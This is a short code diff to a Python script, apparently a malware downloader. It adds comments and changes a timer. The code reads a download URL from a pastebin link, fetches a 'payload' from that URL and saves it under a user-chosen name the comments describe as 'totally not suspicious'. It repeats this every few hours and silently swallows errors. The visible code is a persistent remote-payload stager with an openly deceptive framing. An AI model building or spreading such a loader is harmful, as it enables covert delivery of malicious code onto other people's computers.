@@ -59,7 +59,7 @@ def download_payload(file_name, delete_before_trying):
         except FileNotFoundError:
             pass
     # Get the download link from the server
-    d = requests.get(r"Change this to the pastebin link")
+    d = requests.get(r"Change this to the pastebin link")  # Syntax: "<https://pastebin.com/raw/...>"
     # Download the file and save it to the same dir as the script
     r = requests.get(d.text, allow_redirects=True)
 
@@ -86,8 +86,9 @@ while True:
         pass
 
     try:
+        # Syntax: "<name>"
         download_payload(file_name="put a totally not suspicious name here", delete_before_trying=True)
     except Exception:  # NOQA (No Quality Assurance, suppressed the warning)
         pass
 
-    time.sleep(0.1 * 60 * 60)  # 3 hours
+    time.sleep(3 * 60 * 60)  # Currently 3 hrs for every rerun, change the 3 to any amount for hrs per rerun
